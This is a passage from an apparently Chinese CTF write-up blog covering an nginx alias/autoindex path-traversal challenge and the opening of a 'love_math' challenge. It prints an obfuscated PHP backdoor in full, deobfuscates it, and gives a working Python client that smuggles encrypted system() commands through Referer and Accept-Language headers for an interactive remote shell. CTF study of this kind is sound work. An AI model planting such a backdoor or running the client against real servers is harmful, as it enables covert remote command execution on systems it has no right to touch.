        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/php/php5.6-fpm.sock;
        fastcgi_param SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;
        fastcgi_param SCRIPT_NAME <span class="hljs-variable">$fastcgi_script_name</span>;
        fastcgi_index index.php;
        <span class="hljs-keyword">include</span> fastcgi_params;
        fastcgi_param REMOTE_ADDR <span class="hljs-variable">$http_x_forwarded_for</span>;
    &#125;

    location ~ /\. &#123;
            log_not_found off;
            deny all;
    &#125;
    location /web-img &#123;  <span class="hljs-comment">//这里存在问题</span>
  
        alias /images/;
        autoindex <span class="hljs-keyword">on</span>;
    &#125;
    location ~* \.(ini|docx|pcapng|doc)$ &#123;  
         deny all;  
    &#125;  
    <span class="hljs-keyword">include</span> /<span class="hljs-keyword">var</span>/www/nginx[.]<span class="hljs-keyword">conf</span>;</code></pre>

<p>这个文件内容也看不懂，但是知道这里存在问题</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">location</span> /web-img &#123; 
    <span class="hljs-attribute">alias</span> /images/;
    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;
&#125;</code></pre>

<p><strong>alias</strong>,就是给 /web-img，设置了一个别名，当访问/web-img就相当于访问了 /images/</p>
<pre><code class="hljs awk">location ^~ <span class="hljs-regexp">/t/</span> &#123;
 alias <span class="hljs-regexp">/www/</span>root<span class="hljs-regexp">/html/</span>new_t/;
&#125;</code></pre>

<p>如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。</p>
<p><strong>autoindex</strong> </p>
<p>Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件或你要启用目录浏览虚拟主机的配置文件，在server或location 段里添加上autoindex on</p>
<p>这里将其打开就会导致我们可以访问根目录的所有文件夹</p>
<p>url</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>:<span class="hljs-number">35234</span><span class="hljs-regexp">/web-img../</span>
<span class="hljs-regexp">//</span>    web-img..<span class="hljs-regexp">/  == /im</span>age<span class="hljs-regexp">/../</span> 相当于回退到了根目录</code></pre>



<h3 id="0x3发现漏洞"><a href="#0x3发现漏洞" class="headerlink" title="0x3发现漏洞"></a>0x3发现漏洞</h3><p>在/var/www/中发现了一个hack..php.bak，正好是robots.txt中提示的内容</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$U</span>=<span class="hljs-string">&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;</span>;
<span class="hljs-variable">$q</span>=<span class="hljs-string">&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;</span>;
<span class="hljs-variable">$M</span>=<span class="hljs-string">&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;</span>;
<span class="hljs-variable">$z</span>=<span class="hljs-string">&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;</span>;
<span class="hljs-variable">$k</span>=<span class="hljs-string">&#x27;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;</span>;
<span class="hljs-variable">$o</span>=<span class="hljs-string">&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;</span>;
<span class="hljs-variable">$N</span>=<span class="hljs-string">&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;</span>;
<span class="hljs-variable">$C</span>=<span class="hljs-string">&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;</span>;
<span class="hljs-variable">$j</span>=<span class="hljs-string">&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;</span>;
<span class="hljs-variable">$R</span>=str_replace(<span class="hljs-string">&#x27;rO&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;</span>);
<span class="hljs-variable">$J</span>=<span class="hljs-string">&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;</span>;
<span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#x27;</span>;
<span class="hljs-variable">$f</span>=str_replace(<span class="hljs-string">&#x27;|U&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$j</span>.<span class="hljs-variable">$o</span>.<span class="hljs-variable">$z</span>.<span class="hljs-variable">$x</span>.<span class="hljs-variable">$k</span>.<span class="hljs-variable">$M</span>.<span class="hljs-variable">$J</span>.<span class="hljs-variable">$q</span>.<span class="hljs-variable">$N</span>.<span class="hljs-variable">$U</span>.<span class="hljs-variable">$C</span>);
<span class="hljs-variable">$g</span>=create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$f</span>);
<span class="hljs-variable">$g</span>();
<span class="hljs-meta">?&gt;</span></code></pre>

<p>又是一段奇奇怪怪的代码</p>
<p>但是能看懂最后三行是生成了一个$g函数，而且是由$f生成的，那么久将$f打印出来看看，在线格式化后如下</p>
<p>是一个后门程序，但是如何利用是个问题，实在太菜了，都看不懂写的是什么，只好找到wp</p>
<pre><code class="hljs php"><span class="hljs-variable">$kh</span>=<span class="hljs-string">&quot;42f7&quot;</span>;
<span class="hljs-variable">$kf</span>=<span class="hljs-string">&quot;e9ac&quot;</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$k</span></span>) </span>&#123;
	<span class="hljs-variable">$c</span>=strlen(<span class="hljs-variable">$k</span>);
	<span class="hljs-variable">$l</span>=strlen(<span class="hljs-variable">$t</span>);
	<span class="hljs-variable">$o</span>=<span class="hljs-string">&quot;&quot;</span>;
	<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$l</span>;) &#123;
		<span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;(<span class="hljs-variable">$j</span>&lt;<span class="hljs-variable">$c</span>&amp;&amp;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$l</span>);<span class="hljs-variable">$j</span>++,<span class="hljs-variable">$i</span>++) &#123;
			<span class="hljs-variable">$o</span>.=<span class="hljs-variable">$t</span> &#123;
				<span class="hljs-variable">$i</span>
			&#125;
			^<span class="hljs-variable">$k</span> &#123;
				<span class="hljs-variable">$j</span>
			&#125;
			;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-variable">$o</span>;
&#125;
<span class="hljs-variable">$r</span>=<span class="hljs-variable">$_SERVER</span>;
<span class="hljs-variable">$rr</span>=@<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_REFERER&quot;</span>];
<span class="hljs-variable">$ra</span>=@<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$rr</span>&amp;&amp;<span class="hljs-variable">$ra</span>) &#123;
	<span class="hljs-variable">$u</span>=parse_url(<span class="hljs-variable">$rr</span>);
	parse_str(<span class="hljs-variable">$u</span>[<span class="hljs-string">&quot;query&quot;</span>],<span class="hljs-variable">$q</span>);
	<span class="hljs-variable">$q</span>=array_values(<span class="hljs-variable">$q</span>);
	preg_match_all(<span class="hljs-string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="hljs-variable">$ra</span>,<span class="hljs-variable">$m</span>);
	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$q</span>&amp;&amp;<span class="hljs-variable">$m</span>) &#123;
		@session_start();
		<span class="hljs-variable">$s</span>=&amp;<span class="hljs-variable">$_SESSION</span>;
		<span class="hljs-variable">$ss</span>=<span class="hljs-string">&quot;substr&quot;</span>;
		<span class="hljs-variable">$sl</span>=<span class="hljs-string">&quot;strtolower&quot;</span>;
		<span class="hljs-variable">$i</span>=<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];
		<span class="hljs-variable">$h</span>=<span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(md5(<span class="hljs-variable">$i</span>.<span class="hljs-variable">$kh</span>),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));
		<span class="hljs-variable">$f</span>=<span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(md5(<span class="hljs-variable">$i</span>.<span class="hljs-variable">$kf</span>),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));
		<span class="hljs-variable">$p</span>=<span class="hljs-string">&quot;&quot;</span>;
		<span class="hljs-keyword">for</span> (<span class="hljs-variable">$z</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$z</span>&lt;count(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>]);<span class="hljs-variable">$z</span>++)<span class="hljs-variable">$p</span>.=<span class="hljs-variable">$q</span>[<span class="hljs-variable">$m</span>[<span class="hljs-number">2</span>][<span class="hljs-variable">$z</span>]];
		<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$p</span>,<span class="hljs-variable">$h</span>)===<span class="hljs-number">0</span>) &#123;
			<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]=<span class="hljs-string">&quot;&quot;</span>;
			<span class="hljs-variable">$p</span>=<span class="hljs-variable">$ss</span>(<span class="hljs-variable">$p</span>,<span class="hljs-number">3</span>);
		&#125;
		<span class="hljs-keyword">if</span>(array_key_exists(<span class="hljs-variable">$i</span>,<span class="hljs-variable">$s</span>)) &#123;
			<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>].=<span class="hljs-variable">$p</span>;
			<span class="hljs-variable">$e</span>=strpos(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>],<span class="hljs-variable">$f</span>);
			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$e</span>) &#123;
				<span class="hljs-variable">$k</span>=<span class="hljs-variable">$kh</span>.<span class="hljs-variable">$kf</span>;
				ob_start();
				@<span class="hljs-keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/_/&quot;</span>,<span class="hljs-string">&quot;/-/&quot;</span>),<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>),<span class="hljs-variable">$ss</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>],<span class="hljs-number">0</span>,<span class="hljs-variable">$e</span>))),<span class="hljs-variable">$k</span>)));
				<span class="hljs-variable">$o</span>=ob_get_contents();
				ob_end_clean();
				<span class="hljs-variable">$d</span>=base64_encode(x(gzcompress(<span class="hljs-variable">$o</span>),<span class="hljs-variable">$k</span>));
				<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;<span class="hljs-subst">$k</span>&gt;<span class="hljs-subst">$d</span>&lt;/<span class="hljs-subst">$k</span>&gt;&quot;</span>);
				@session_destroy();
			&#125;
		&#125;
	&#125;
&#125;</code></pre>

<p>做个分析</p>
<ul>
<li>先是预定义阶段 , 定义了两个字符串和一个 <code>x()</code> 函数</li>
<li>然后获取攻击者发送的数据 , 这里攻击代码是通过 Referer 字段传输的</li>
<li>注意正则函数 preg_match_all() , 该函数从 <a href="https://blog.csdn.net/qq_40491569/article/details/83472556">Accept-Language</a> 取值 , 然后通过正则匹配后输出到 <code>$m</code> 数组中</li>
<li>然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 <code>$h</code> 和 <code>$f</code> 两个变量</li>
<li>循环中的 <code>$p .= $q[$m[2][$z]]</code> 会不断从 <code>$q</code> 中提取数据 . 结合之前的代码 , 攻击代码是放在 Referer 中的( 最后会放在 <code>$q</code> 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload .</li>
<li>然后判断 <code>$h</code> 是否出现在 Payload 的开头 , 若是则设置 <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code> , 同时删除 Payload 的 $h 部分 .</li>
<li>接着判断 <code>$_SESSION</code> 中那个是否存在 <code>$i</code> 这个键名 , 若是则将 Payload 赋值给 <code>$_SESSION[$i]</code> , 然后查找 <code>$_SESSION[$i]</code>( 也就是 Payload ) 中 <code>$f</code> 第一次出现的位置 .</li>
<li>最后执行payload</li>
</ul>
<p>exp：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint,choice
<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re

<span class="hljs-comment"># 用于生成完整的 Accept-Language</span>
<span class="hljs-keyword">from</span> urllib3.connectionpool <span class="hljs-keyword">import</span> xrange
<span class="hljs-keyword">from</span> yapf.yapflib.py3compat <span class="hljs-keyword">import</span> raw_input


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choicePart</span>(<span class="hljs-params">seq,amount</span>):</span>
    length = <span class="hljs-built_in">len</span>(seq)
    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> length &lt; amount:
        print(<span class="hljs-string">&#x27;Error Input&#x27;</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    result = []    <span class="hljs-comment"># 结果</span>
    indexes = []    <span class="hljs-comment"># 索引</span>
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> count &lt; amount:
        i = randint(<span class="hljs-number">0</span>,length-<span class="hljs-number">1</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> indexes:
            indexes.append(i)
            result.append(seq[i])
            count += <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> count == amount:
                <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 )</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randBytesFlow</span>(<span class="hljs-params">amount</span>):</span>
    result = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
        result += <span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>))
    <span class="hljs-keyword">return</span>  result

<span class="hljs-comment"># 生成随机填充字符串( 由所有大小写字母组成 )</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randAlpha</span>(<span class="hljs-params">amount</span>):</span>
    result = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
        <span class="hljs-comment"># choice() 方法返回一个列表，元组或字符串的随机项</span>
        <span class="hljs-comment"># string.ascii_letters 会生成所有的字母</span>
        result += choice(string.ascii_letters)
    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># 模拟 x() 函数 , 循环异或加密</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loopXor</span>(<span class="hljs-params">text,key</span>):</span>
    result = <span class="hljs-string">&#x27;&#x27;</span>
    lenKey = <span class="hljs-built_in">len</span>(key)
    lenTxt = <span class="hljs-built_in">len</span>(text)
    iTxt = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> iTxt &lt; lenTxt:
        iKey = <span class="hljs-number">0</span>
        <span class="hljs-keyword">while</span> iTxt&lt;lenTxt <span class="hljs-keyword">and</span> iKey&lt;lenKey:
            result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[iKey]) ^ <span class="hljs-built_in">ord</span>(text[iTxt]))
            iTxt += <span class="hljs-number">1</span>
            iKey += <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># 开启 Debug 选项</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debugPrint</span>(<span class="hljs-params">msg</span>):</span>
    <span class="hljs-keyword">if</span> debugging:
        <span class="hljs-built_in">print</span> (msg)

<span class="hljs-comment"># 定义基本变量</span>
debugging = <span class="hljs-literal">False</span>    <span class="hljs-comment"># 默认关闭 Debug , 可用 True 开启</span>
keyh = <span class="hljs-string">&quot;42f7&quot;</span>    <span class="hljs-comment"># $kh , 需要修改</span>
keyf = <span class="hljs-string">&quot;e9ac&quot;</span>    <span class="hljs-comment"># $kf , 需要修改</span>
xorKey = keyh + keyf    <span class="hljs-comment"># $k</span>
url = <span class="hljs-string">&#x27;http://111.198.29.45:47960/hack.php&#x27;</span>    <span class="hljs-comment"># 指定 URL  , 需要修改</span>
defaultLang = <span class="hljs-string">&#x27;zh-CN&#x27;</span>    <span class="hljs-comment">#默认Language</span>
languages = [<span class="hljs-string">&#x27;zh-TW;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;zh-HK;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;en-US;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;en;q=0.%d&#x27;</span>]    <span class="hljs-comment">#Accept-Language 模板</span>
proxies = <span class="hljs-literal">None</span>    <span class="hljs-comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # 代理 , 可用于 BurpSuite 等</span>
sess = requests.Session()    <span class="hljs-comment"># 创建一个 SESSION 对象</span>

<span class="hljs-comment"># 每次会话会产生一次随机的 Accept-Language</span>
langTmp = choicePart(languages,<span class="hljs-number">3</span>)    <span class="hljs-comment"># 输出一个列表 , 包含模板中的三种 Accept-language</span>
indexes = <span class="hljs-built_in">sorted</span>(choicePart(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>),<span class="hljs-number">3</span>), reverse=<span class="hljs-literal">True</span>)    <span class="hljs-comment"># 降序排序输出三个权重值 , 例如 [8,6,4]</span>

acceptLang = [defaultLang]   <span class="hljs-comment"># 先添加默认Language</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):
    acceptLang.append(langTmp[i] % (indexes[i],))    <span class="hljs-comment"># 然后循环添加三种 Accept-Language , 并为其添加权重值</span>
acceptLangStr = <span class="hljs-string">&#x27;,&#x27;</span>.join(acceptLang)    <span class="hljs-comment"># 将多个 Accept-Language 用 &quot; , &quot; 拼接在一起</span>
<span class="hljs-comment"># acceptLangStr 即为要使用的 Accept-Language</span>
debugPrint(acceptLangStr)

init2Char = acceptLang[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + acceptLang[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]    <span class="hljs-comment"># $i</span>
md5head = (md5(init2Char + keyh).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]    <span class="hljs-comment"># $h</span>
md5tail = (md5(init2Char + keyf).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>] + randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))    <span class="hljs-comment"># $f + 填充字符串</span>
debugPrint(<span class="hljs-string">&#x27;$i is %s&#x27;</span> % (init2Char))
debugPrint(<span class="hljs-string">&#x27;md5 head: %s&#x27;</span> % (md5head,))
debugPrint(<span class="hljs-string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))

<span class="hljs-comment"># 交互式 Shell</span>
cmd = <span class="hljs-string">&quot;system(&#x27;&quot;</span> + raw_input(<span class="hljs-string">&#x27;shell &gt; &#x27;</span>) + <span class="hljs-string">&quot;&#x27;);&quot;</span>
<span class="hljs-keyword">while</span> cmd != <span class="hljs-string">&#x27;&#x27;</span>:
    <span class="hljs-comment"># 在写入 Payload 前填充一些无关数据</span>
    query = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">max</span>(indexes)+<span class="hljs-number">1</span>+randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)):
        key = randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>))
        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="hljs-number">3</span>,<span class="hljs-number">12</span>)))
        query.append((key, value))    <span class="hljs-comment"># 生成无关数据并填充</span>
    debugPrint(<span class="hljs-string">&#x27;Before insert payload:&#x27;</span>)
    debugPrint(query)
    debugPrint(urllib.urlencode(query))

    <span class="hljs-comment"># 对 Payload 进行加密</span>
    payload = zlib.compress(cmd)    <span class="hljs-comment"># gzcompress 操作</span>
    payload = loopXor(payload,xorKey)    <span class="hljs-comment"># 循环异或运算 , PHP代码中的 x() 函数</span>
    payload = base64.urlsafe_b64encode(payload)    <span class="hljs-comment"># base64_encode 编码</span>
    payload = md5head + payload    <span class="hljs-comment">#    在开头补全$h</span>

    <span class="hljs-comment">#  对Payload进行修改</span>
    cutIndex = randint(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">3</span>)
    payloadPieces = (payload[<span class="hljs-number">0</span>:cutIndex], payload[cutIndex:], md5tail)
    iPiece = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexes:
        query[i] = (query[i][<span class="hljs-number">0</span>],payloadPieces[iPiece])
        iPiece += <span class="hljs-number">1</span>
    <span class="hljs-comment"># 将 Payload 作为查询字符串编码拼接到 Referer 中</span>
    referer = url + <span class="hljs-string">&#x27;?&#x27;</span> + urllib.urlencode(query)
    debugPrint(<span class="hljs-string">&#x27;After insert payload, referer is:&#x27;</span>)
    debugPrint(query)
    debugPrint(referer)

    <span class="hljs-comment"># 发送 HTTP GET 请求</span>
    r = sess.get(url,headers=&#123;<span class="hljs-string">&#x27;Accept-Language&#x27;</span>:acceptLangStr,<span class="hljs-string">&#x27;Referer&#x27;</span>:referer&#125;,proxies=proxies)
    html = r.text
    debugPrint(html)

    <span class="hljs-comment"># 接收响应数据包</span>
    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey,xorKey))
    output = pattern.findall(html)
    <span class="hljs-comment"># 如果没有收到响应数据包</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">0</span>:
        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Error,  no backdoor response&#x27;</span>)
        cmd = <span class="hljs-string">&quot;system(&#x27;&quot;</span> + raw_input(<span class="hljs-string">&#x27;shell &gt; &#x27;</span>) + <span class="hljs-string">&quot;&#x27;);&quot;</span>
        <span class="hljs-keyword">continue</span>
    <span class="hljs-comment"># 如果收到响应数据包 , 则对其进行处理</span>
    output = output[<span class="hljs-number">0</span>]
    debugPrint(output)
    output = output.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)    <span class="hljs-comment"># base64_decode 解码</span>
    output = loopXor(output,xorKey)    <span class="hljs-comment"># 循环异或运算</span>
    output = zlib.decompress(output)   <span class="hljs-comment"># gzuncompress 运算</span>
    print(output)    <span class="hljs-comment"># 输出响应信息</span>
    cmd = <span class="hljs-string">&quot;system(&#x27;&quot;</span> + raw_input(<span class="hljs-string">&#x27;shell &gt; &#x27;</span>) + <span class="hljs-string">&quot;&#x27;);&quot;</span></code></pre>



<p>难度属实有点大了，超出能力范围。</p>
<p>参考</p>
<blockquote>
<p><a href="https://www.guildhab.top/?p=1474">Web_php_wrong_nginx_config WriteUp – H0t-A1r-B4llo0n (guildhab.top)</a></p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/107801811">(2条消息) 攻防世界 web高手进阶区 7分题 Web_php_wrong_nginx_config_闵行小鱼塘-CSDN博客</a></p>
</blockquote>
<h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><p>这出题人大意了啊。。。直接可以给显示出来了</p>
<p><img src="https://i.loli.net/2020/12/05/bPZfgzaGHwDoinr.png" alt="image-20201205201112120"></p>
<p>还是正常做一做，这题好像有问题，就在buuctf上做了</p>
<h3 id="0x1代码审计-1"><a href="#0x1代码审计-1" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-comment">//例子 c=20-1</span>
    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];
    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);
    &#125;
    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);
        &#125;
    &#125;
    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
